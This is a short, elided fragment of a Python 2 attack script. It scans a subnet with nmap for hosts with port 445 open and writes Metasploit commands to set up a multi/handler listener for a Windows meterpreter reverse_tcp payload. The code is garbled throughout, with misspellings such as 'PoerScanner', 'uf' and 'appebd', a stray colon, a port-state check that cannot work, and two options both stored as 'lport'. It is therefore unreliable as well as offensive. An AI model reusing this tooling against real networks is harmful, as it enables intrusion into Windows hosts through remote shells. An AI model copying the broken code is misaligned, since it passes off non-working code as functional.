...
import nmap
def findTgts(subNet):
    nmScan = nmap.PoerScanner()
    nmScan.scan(subNet,'445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host].has_tcp(445):
            uf state == 'open':
            print '[+] Found Target Host:'+host
            tgtHosts.appebd(host)
    return tgtHosts
def setupHandler(configFile,lhost,lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload'+'windows/,eterpreter/reverse_tcp\n')
...
def main():
    ...
    parser.add_option('-p',desy='lport',type='string',help='specify the listen port')
    parser.add_option('-l',dest='lport',type='string',help='specify the listen address')
